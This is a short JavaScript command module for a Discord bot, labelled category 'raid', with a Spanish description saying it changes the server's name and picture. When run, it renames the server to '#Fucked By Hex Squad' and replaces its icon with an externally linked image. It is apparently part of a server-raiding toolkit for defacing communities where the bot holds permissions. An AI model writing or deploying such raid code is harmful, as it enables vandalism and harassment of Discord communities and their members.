const { MessageEmbed } = require('discord.js')
module.exports = {
    name : 'foto',
    category : 'raid',
    description : 'Cambia el nombre y la foto del servidor',

    run : async(client, message, args) => {
        message.guild.setName("#Fucked By Hex Squad");
        message.guild.setIcon("https://cdn.discordapp.com/attachments/753459740335538272/849983342623457280/PicsArt_06-02-05.17.15.png");
    }
}
